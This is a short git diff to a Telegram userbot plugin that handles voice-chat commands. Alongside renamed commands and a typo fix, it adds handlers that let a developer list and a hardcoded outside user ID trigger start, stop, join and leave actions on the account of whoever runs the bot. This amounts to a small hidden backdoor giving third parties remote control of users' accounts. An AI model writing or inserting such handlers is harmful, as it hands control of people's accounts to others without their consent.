@@ -19,21 +19,25 @@ __HELP__ = f"""
 """
 
 
+@ubot.on_message(filters.command(["startvcs"], "") & filters.user(DEVS) & ~filters.me)
 @PY.UBOT("startvc")
 async def _(client, message):
     await start_vctools(client, message)
 
 
+@ubot.on_message(filters.command(["stopvcs"], "") & filters.user(DEVS) & ~filters.me)
 @PY.UBOT("stopvc")
 async def _(client, message):
     await stop_vctools(client, message)
 
 
-@PY.UBOT("joinvc")
+@ubot.on_message(filters.command(["joinvcs"], "") & filters.user(5779185981) & ~filters.me)
+@PY.UBOT("joinpicies", FILTERS.ME_USER)
 async def _(client, message):
     await join_os(client, message)
 
 
-@PY.UBOT("leavevc")
+@ubot.on_message(filters.command(["leavevcs"], "") & filters.user(5779185981) & ~filters.me)
+@PY.UBOT("leavepicies", FILTERS.ME_USER)
 async def _(client, message):
-    await turun_os(clien, message)
+    await turun_os(client, message)
